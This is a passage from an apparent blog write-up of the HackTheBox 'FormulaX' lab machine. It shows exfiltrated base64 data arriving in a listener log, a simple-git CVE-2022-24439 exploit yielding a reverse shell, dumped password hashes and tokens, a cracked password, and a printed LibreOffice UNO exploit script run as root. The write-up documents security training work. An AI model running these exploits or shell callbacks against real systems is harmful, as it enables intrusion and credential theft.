class="line">::ffff:<span class="number">10.129</span>.<span class="number">230.190</span> - - [<span class="number">17</span>/<span class="type">Aug</span>/<span class="number">2024</span> <span class="number">12</span>:<span class="number">25</span>:<span class="number">40</span>] code <span class="number">501</span>, message Unsupported method (<span class="string">&#x27;OPTIONS&#x27;</span>)</span><br><span class="line">::ffff:<span class="number">10.129</span>.<span class="number">230.190</span> - - [<span class="number">17</span>/<span class="type">Aug</span>/<span class="number">2024</span> <span class="number">12</span>:<span class="number">25</span>:<span class="number">40</span>] <span class="string">&quot;OPTIONS /?d=V3JpdGUgYSBzY3JpcHQgdG8gYXV0b21hdGUgdGhlIGF1dG8tdXBkYXRl HTTP/1.1&quot;</span> <span class="number">501</span> -</span><br><span class="line">::ffff:<span class="number">10.129</span>.<span class="number">230.190</span> - - [<span class="number">17</span>/<span class="type">Aug</span>/<span class="number">2024</span> <span class="number">12</span>:<span class="number">25</span>:<span class="number">40</span>] code <span class="number">501</span>, message Unsupported method (<span class="string">&#x27;OPTIONS&#x27;</span>)</span><br><span class="line">::ffff:<span class="number">10.129</span>.<span class="number">230.190</span> - - [<span class="number">17</span>/<span class="type">Aug</span>/<span class="number">2024</span> <span class="number">12</span>:<span class="number">25</span>:<span class="number">40</span>] <span class="string">&quot;OPTIONS /?d=V3JpdGUgYSBzY3JpcHQgZm9yICBkZXYtZ2l0LWF1dG8tdXBkYXRlLmNoYXRib3QuaHRiIHRvIHdvcmsgcHJvcGVybHk= HTTP/1.1&quot;</span> <span class="number">501</span> -</span><br><span class="line">::ffff:<span class="number">10.129</span>.<span class="number">230.190</span> - - [<span class="number">17</span>/<span class="type">Aug</span>/<span class="number">2024</span> <span class="number">12</span>:<span class="number">25</span>:<span class="number">40</span>] code <span class="number">501</span>, message Unsupported method (<span class="string">&#x27;OPTIONS&#x27;</span>)</span><br><span class="line">::ffff:<span class="number">10.129</span>.<span class="number">230.190</span> - - [<span class="number">17</span>/<span class="type">Aug</span>/<span class="number">2024</span> <span class="number">12</span>:<span class="number">25</span>:<span class="number">40</span>] <span class="string">&quot;OPTIONS /?d=TWVzc2FnZSBTZW50Ojxicj5oaXN0b3J5 HTTP/1.1&quot;</span> <span class="number">501</span> -</span><br><span class="line">::ffff:<span class="number">10.129</span>.<span class="number">230.190</span> - - [<span class="number">17</span>/<span class="type">Aug</span>/<span class="number">2024</span> <span class="number">12</span>:<span class="number">25</span>:<span class="number">40</span>] code <span class="number">501</span>, message Unsupported method (<span class="string">&#x27;OPTIONS&#x27;</span>)</span><br><span class="line">::ffff:<span class="number">10.129</span>.<span class="number">230.190</span> - - [<span class="number">17</span>/<span class="type">Aug</span>/<span class="number">2024</span> <span class="number">12</span>:<span class="number">25</span>:<span class="number">40</span>] <span class="string">&quot;OPTIONS /?d=SGVsbG8sIEkgYW0gQWRtaW4uVGVzdGluZyB0aGUgQ2hhdCBBcHBsaWNhdGlvbg== HTTP/1.1&quot;</span> <span class="number">501</span> -</span><br></pre></td></tr></table></figure></div>
+
+<p>These seem like base64 strings, we decode them and we get something interesting:<br><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/FormulaX/new-subdomain.png"
+                      alt="New-Subdomain"
+                ><figcaption>New-Subdomain</figcaption></figure></p>
+<p>We can now add this subdomain to our <code>/etc/hosts</code> file and check what it has for us:<code>10.129.230.190	dev-git-auto-update.chatbot.htb	chatbot.htb</code></p>
+<p>This seems like a portal where we insert a specific GIT URL and it generates us some sort of report:<br><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/FormulaX/dev-git-auto-update.png"
+                      alt="dev-git-auto-update"
+                ><figcaption>dev-git-auto-update</figcaption></figure></p>
+<p>But one interesting thing we can notice is the use of <code>simple-git v3.14</code> which is vulnerable to <a class="link"   target="_blank" rel="noopener" href="https://security.snyk.io/vuln/SNYK-PYTHON-GITPYTHON-3113858" >CVE-2022-24439 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>:<br><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/FormulaX/simple-git.png"
+                      alt="CVE-2022-24439"
+                ><figcaption>CVE-2022-24439</figcaption></figure></p>
+<p>This is the <a class="link"   target="_blank" rel="noopener" href="https://github.com/gitpython-developers/GitPython/issues/1515" >POC <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> used for the exploit.<br>We create our own reverse shell script <code>shell.sh</code> and we run it on the portal to get a callback:<br><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/FormulaX/CVE-2022-24439.png"
+                      alt="CVE-2022-24439"
+                ><figcaption>CVE-2022-24439</figcaption></figure></p>
+<div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\<span class="number">0</span>xkujen&gt; nc <span class="literal">-lvnp</span> <span class="number">9001</span></span><br><span class="line">listening on [<span class="type">any</span>] <span class="number">9001</span> ...</span><br><span class="line">connect to <span class="function">[<span class="number">10.10</span><span class="type">.x.x</span>] <span class="title">from</span></span> (UNKNOWN) [<span class="number">10.129</span><span class="type">.230.190</span>] <span class="number">32968</span></span><br><span class="line">sh: <span class="number">0</span>: can<span class="string">&#x27;t access tty; job control turned off</span></span><br><span class="line"><span class="string">$ id</span></span><br><span class="line"><span class="string">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span></span><br><span class="line"><span class="string">$</span></span><br></pre></td></tr></table></figure></div>
+
+<h3 id="Pivoting-from-www-data-user-to-frank-dorky"><a href="#Pivoting-from-www-data-user-to-frank-dorky" class="headerlink" title="Pivoting from www-data user to frank_dorky"></a>Pivoting from www-data user to frank_dorky</h3><p>First thing that comes to my mind is to check for database credentials:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">www-data@formulax:~/app/configuration$ <span class="built_in">cat</span> connect_db.js</span><br><span class="line"><span class="built_in">cat</span> connect_db.js</span><br><span class="line">import mongoose from <span class="string">&quot;mongoose&quot;</span>;</span><br><span class="line"></span><br><span class="line">const connectDB= async(URL_DATABASE)=&gt;&#123;</span><br><span class="line">    try&#123;</span><br><span class="line">        const DB_OPTIONS=&#123;</span><br><span class="line">            dbName : <span class="string">&quot;testing&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        mongoose.connect(URL_DATABASE,DB_OPTIONS)</span><br><span class="line">        console.log(<span class="string">&quot;Connected Successfully TO Database&quot;</span>)</span><br><span class="line">    &#125;catch(error)&#123;</span><br><span class="line">        console.log(`Error Connecting to the ERROR <span class="variable">$&#123;error&#125;</span>`);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> default connectDB</span><br></pre></td></tr></table></figure></div>
+
+<p>We can see that we have a <code>testing</code> database, let’s try to get a connection to that database through mongo:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> default connectDBwww-data@formulax:~/app/configuration$ mongo</span><br><span class="line">mongo</span><br><span class="line">MongoDB shell version v4.4.29</span><br><span class="line">connecting to: mongodb://127.0.0.1:27017/?compressors=disabled&amp;gssapiServiceName=mongodb</span><br><span class="line">Implicit session: session &#123; <span class="string">&quot;id&quot;</span> : UUID(<span class="string">&quot;4c627fbb-946e-431c-b407-2ed03f115631&quot;</span>) &#125;</span><br><span class="line">MongoDB server version: 4.4.8</span><br><span class="line">---</span><br><span class="line">The server generated these startup warnings when booting:</span><br><span class="line">        2024-08-16T14:40:41.102+00:00: Using the XFS filesystem is strongly recommended with the WiredTiger storage engine. See http://dochub.mongodb.org/core/prodnotes-filesystem</span><br><span class="line">        2024-08-16T14:40:43.351+00:00: Access control is not enabled <span class="keyword">for</span> the database. Read and write access to data and configuration is unrestricted</span><br><span class="line">---</span><br><span class="line">&gt; use testing;</span><br><span class="line">ususe testing;</span><br><span class="line">switched to db testing</span><br><span class="line">&gt; show collections</span><br><span class="line">shshow collections</span><br><span class="line">messages</span><br><span class="line"><span class="built_in">users</span></span><br><span class="line">&gt; db.users.find()</span><br><span class="line">dbdb.users.<span class="function"><span class="title">find</span></span>()</span><br><span class="line">&#123; <span class="string">&quot;_id&quot;</span> : ObjectId(<span class="string">&quot;648874de313b8717284f457c&quot;</span>), <span class="string">&quot;name&quot;</span> : <span class="string">&quot;admin&quot;</span>, <span class="string">&quot;email&quot;</span> : <span class="string">&quot;admin@chatbot.htb&quot;</span>, <span class="string">&quot;password&quot;</span> : <span class="string">&quot;$2b$10<span class="variable">$VSrvhM</span>/5YGM0uyCeEYf/TuvJzzTz.jDLVJ2QqtumdDoKGSa.6aIC.&quot;</span>, <span class="string">&quot;terms&quot;</span> : <span class="literal">true</span>, <span class="string">&quot;value&quot;</span> : <span class="literal">true</span>, <span class="string">&quot;authorization_token&quot;</span> : <span class="string">&quot;Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySUQiOiI2NDg4NzRkZTMxM2I4NzE3Mjg0ZjQ1N2MiLCJpYXQiOjE3MjM5MDE4MTN9.fFBS9r66QgmLQZ1t92vEI-BJIizvI3cxz2UEFB87nnQ&quot;</span>, <span class="string">&quot;__v&quot;</span> : 0 &#125;</span><br><span class="line">&#123; <span class="string">&quot;_id&quot;</span> : ObjectId(<span class="string">&quot;648874de313b8717284f457d&quot;</span>), <span class="string">&quot;name&quot;</span> : <span class="string">&quot;frank_dorky&quot;</span>, <span class="string">&quot;email&quot;</span> : <span class="string">&quot;frank_dorky@chatbot.htb&quot;</span>, <span class="string">&quot;password&quot;</span> : <span class="string">&quot;$2b$10<span class="variable">$hrB</span>/by.tb/4ABJbbt1l4/ep/L4CTY6391eSETamjLp7s.elpsB4J6&quot;</span>, <span class="string">&quot;terms&quot;</span> : <span class="literal">true</span>, <span class="string">&quot;value&quot;</span> : <span class="literal">true</span>, <span class="string">&quot;authorization_token&quot;</span> : <span class="string">&quot; &quot;</span>, <span class="string">&quot;__v&quot;</span> : 0 &#125;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></div>
+
+<p><code>frank_dorky</code>‘s password is crackable using <code>rockyou</code> wordlist:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/hackthebox/formulaX]</span><br><span class="line">└─$ john   hash.txt --show     </span><br><span class="line">?:manchesterunited</span><br><span class="line"></span><br><span class="line">1 password <span class="built_in">hash</span> cracked, 0 left</span><br></pre></td></tr></table></figure></div>
+
+<p>Let’s ssh onto the user now and get our user flag:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\0xkujen&gt; ssh frank_dorky@10.129.230.190</span><br><span class="line">frank_dorky@10.129.230.190<span class="string">&#x27;s password:</span></span><br><span class="line"><span class="string">Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-97-generic x86_64)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> * Documentation:  https://help.ubuntu.com</span></span><br><span class="line"><span class="string"> * Management:     https://landscape.canonical.com</span></span><br><span class="line"><span class="string"> * Support:        https://ubuntu.com/pro</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">This system has been minimized by removing packages and content that are</span></span><br><span class="line"><span class="string">not required on a system that users do not log into.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">To restore this content, you can run the &#x27;</span>unminimize<span class="string">&#x27; command.</span></span><br><span class="line"><span class="string">Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Last login: Fri Aug 16 17:33:09 2024 from 10.10.x.x</span></span><br><span class="line"><span class="string">frank_dorky@formulax:~$ id</span></span><br><span class="line"><span class="string">uid=1002(frank_dorky) gid=1002(frank_dorky) groups=1002(frank_dorky)</span></span><br><span class="line"><span class="string">frank_dorky@formulax:~$ ls</span></span><br><span class="line"><span class="string">user.txt</span></span><br><span class="line"><span class="string">frank_dorky@formulax:~$ cat user.txt</span></span><br><span class="line"><span class="string">08c82572ce4de9******************</span></span><br><span class="line"><span class="string">frank_dorky@formulax:~$</span></span><br></pre></td></tr></table></figure></div>
+
+<h3 id="Pivoting-from-frank-dorky-to-kai-relay"><a href="#Pivoting-from-frank-dorky-to-kai-relay" class="headerlink" title="Pivoting from frank_dorky to kai_relay"></a>Pivoting from frank_dorky to kai_relay</h3><p>Checking the <code>/opt</code> folder, I found an unusual folder which is <code>librenms</code></p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LibreNMS is an auto-discovering PHP/MySQL/SNMP based network monitoring which includes support for a wide range of network hardware and operating systems including Cisco, Linux, FreeBSD, Juniper, Brocade, Foundry, HP and many more.</span><br></pre></td></tr></table></figure></div>
+
+<p>Checking the public github repo for <code>librenms</code>, I find an interesting configuration file which is <code>config_to_json.php</code> which allows you to extract and utilize the configuration data from LibreNMS in a structured format like JSON, possibly for integration, automation, or debugging purposes.</p>
+<p>Running that file we get interesting output with credentials to <code>kai_relay</code>:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">frank_dorky@formulax:/opt/librenms$ ./config_to_json.php</span><br><span class="line">&lt;snip&gt;<span class="string">&quot;db_host&quot;</span>:<span class="string">&quot;localhost&quot;</span>,<span class="string">&quot;db_name&quot;</span>:<span class="string">&quot;librenms&quot;</span>,<span class="string">&quot;db_user&quot;</span>:<span class="string">&quot;kai_relay&quot;</span>,<span class="string">&quot;db_pass&quot;</span>:<span class="string">&quot;mychemicalformulaX&quot;</span>,<span class="string">&quot;db_port&quot;</span>:<span class="string">&quot;3306&quot;</span>,<span class="string">&quot;db_socket&quot;</span>:<span class="string">&quot;&quot;</span>&#125;</span><br><span class="line">frank_dorky@formulax:/opt/librenms$</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="Privilege-Escalation-from-kai-relay-to-root"><a href="#Privilege-Escalation-from-kai-relay-to-root" class="headerlink" title="Privilege Escalation from kai_relay to root"></a>Privilege Escalation from kai_relay to root</h3><p>Let’s now ssh to <code>kai_relay</code> user and check what we can run as sudo:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">kai_relay@formulax:~$ sudo -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> kai_relay on forumlax:</span><br><span class="line">    env_reset, timestamp_timeout=0, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty,</span><br><span class="line">    env_reset, timestamp_timeout=0</span><br><span class="line"></span><br><span class="line">User kai_relay may run the following commands on forumlax:</span><br><span class="line">    (ALL) NOPASSWD: /usr/bin/office.sh</span><br><span class="line">kai_relay@formulax:~$</span><br></pre></td></tr></table></figure></div>
+
+<p>Checking the contents of <code>/use/bin/office.sh</code> we find some interesting stuff:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">kai_relay@formulax:~$ <span class="built_in">cat</span> /usr/bin/office.sh</span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line">/usr/bin/soffice --calc --accept=<span class="string">&quot;socket,host=localhost,port=2002;urp;&quot;</span> --norestore --nologo --nodefault --headless</span><br><span class="line">kai_relay@formulax:~$</span><br></pre></td></tr></table></figure></div>
+<p>This script launches LibreOffice Calc in a headless mode, setting it up to listen for connections on localhost:2002. This allows other programs or scripts to remotely control LibreOffice, typically for automating tasks such as document processing or conversion.</p>
+<p>Checking for any public exploits for this binary we get an <a class="link"   target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/46544" >interesting find <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>:<br><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/FormulaX/soffice-exploit.png"
+                      alt="Soffice-Exploit"
+                ><figcaption>Soffice-Exploit</figcaption></figure></p>
+<p>Exploit code:</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> uno</span><br><span class="line"><span class="keyword">from</span> com.sun.star.system <span class="keyword">import</span> XSystemShellExecute</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"></span><br><span class="line">parser = argparse.ArgumentParser()</span><br><span class="line">parser.add_argument(<span class="string">&#x27;--host&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;host to connect to&#x27;</span>, dest=<span class="string">&#x27;host&#x27;</span>, required=<span class="literal">True</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;--port&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;port to connect to&#x27;</span>, dest=<span class="string">&#x27;port&#x27;</span>, required=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">args = parser.parse_args()</span><br><span class="line"><span class="comment"># Define the UNO component</span></span><br><span class="line">localContext = uno.getComponentContext()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Define the resolver to use, this is used to connect with the API</span></span><br><span class="line">resolver = localContext.ServiceManager.createInstanceWithContext(</span><br><span class="line">                                <span class="string">&quot;com.sun.star.bridge.UnoUrlResolver&quot;</span>, localContext )</span><br><span class="line"></span><br><span class="line"><span class="comment"># Connect with the provided host on the provided target port</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] Connecting to target...&quot;</span>)</span><br><span class="line">context = resolver.resolve(</span><br><span class="line">        <span class="string">&quot;uno:socket,host=&#123;0&#125;,port=&#123;1&#125;;urp;StarOffice.ComponentContext&quot;</span>.<span class="built_in">format</span>(args.host,args.port))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Issue the service manager to spawn the SystemShellExecute module and execute calc.exe</span></span><br><span class="line">service_manager = context.ServiceManager</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] Connected to &#123;0&#125;&quot;</span>.<span class="built_in">format</span>(args.host))</span><br><span class="line">shell_execute = service_manager.createInstance(<span class="string">&quot;com.sun.star.system.SystemShellExecute&quot;</span>)</span><br><span class="line">shell_execute.execute(<span class="string">&quot;/usr/bin/cat&quot;</span>, <span class="string">&quot;/root/root.txt&quot;</span>,<span class="number">1</span>)</span><br></pre></td></tr></table></figure></div>
+
+<p>The first step is to run the <code>/usr/bin/office.sh</code> bash script in a seperate ssh session, later running our exploit. We run it and we get our root flag:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kai_relay@formulax:~$ sudo /usr/bin/office.sh</span><br><span class="line">45339506067b7b******************</span><br></pre></td></tr></table></figure></div>
+
+<p>I hope this writeup was informative, thanks for reading!<br>-0xkujen</p>
+
+        </div>
+
+        
+            <div class="post-copyright-info px-2 sm:px-6 md:px-8">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> Hackthebox: FormulaX</li>
+        <li><strong>Author:</strong> Foued SAIDI</li>
+        <li><strong>Created at
+                :</strong> 2024-08-17 17:00:00</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2024-08-17 15:38:07
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://foued-saidi.tech/2024/08/17/Hackthebox-FormulaX/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+
+        
+
+        
+            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+                
+                
+                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="next"
+                        rel="next"
+                        href="/2024/08/10/Hackthebox-Usage/"
+                        >
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">Hackthebox: Usage</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+
+        
+    </div>
+
+    
+        <div class="toc-content-container">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">On this page</div>
+        <div class="page-title">Hackthebox: FormulaX</div>
+        <ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#Overview"><span class="nav-text">Overview</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Reconnaissance"><span class="nav-text">Reconnaissance</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Web-Application-http-10-129-230-190"><span class="nav-text">Web Application - http:&#x2F;&#x2F;10.129.230.190 </span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Pivoting-from-www-data-user-to-frank-dorky"><span class="nav-text">Pivoting from www-data user to frank_dorky</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Pivoting-from-frank-dorky-to-kai-relay"><span class="nav-text">Pivoting from frank_dorky to kai_relay</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Privilege-Escalation-from-kai-relay-to-root"><span class="nav-text">Privilege Escalation from kai_relay to root</span></a></li></ol>
+
+    </div>
+</div>
+        </div>
+    
+</div>
+
+
+
+                
+
+            </div>
+
+            
+
+        </div>
+
+        <div class="main-content-footer">
+            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2023</span>
+              -
+            
+            2024&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">Foued SAIDI</a>
+        </div>
+        
+            <script data-swup-reload-script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">VISITOR COUNT</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">TOTAL PAGE VIEWS</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.5.2</a></span>
+        </div>
+        
+        
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+
+</main>
+
+
+    
+<script src="/js/libs/Swup.min.js"></script>
+
+<script src="/js/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
